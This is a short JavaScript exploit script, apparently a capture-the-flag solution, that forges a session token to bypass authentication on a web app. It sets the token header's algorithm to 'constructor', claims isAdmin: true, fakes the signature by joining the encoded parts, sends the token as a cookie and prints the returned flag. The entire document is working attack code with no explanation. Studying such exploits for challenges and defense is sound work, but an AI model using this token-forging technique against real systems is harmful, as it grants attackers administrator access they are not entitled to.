
const APP_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");

const craft_token = () => {
	const base64UrlEncode = (str) => {
		return Buffer.from(str).toString('base64').replace(/=*$/g, '').replace(/\+/g, '-').replace(/\//g, '_');
	}

	const stringifyPart = (obj) => {
		return base64UrlEncode(JSON.stringify(obj));
	}

	const header = { alg: 'constructor' };
	const payload = { isAdmin: true };
	const signature = `${stringifyPart(header)}${stringifyPart(payload)}`;

	const token = `${stringifyPart(header)}.${stringifyPart(payload)}.${signature}`;
	return token;
}


const exploit = async () => {
	const token = craft_token();
	const response = await fetch(APP_URL, {
		headers: {
			cookie: `session=${token}`
		}
	});
	const content = await response.text();
	console.log(content);  // flag
}

(async () => {
	await exploit();
})();
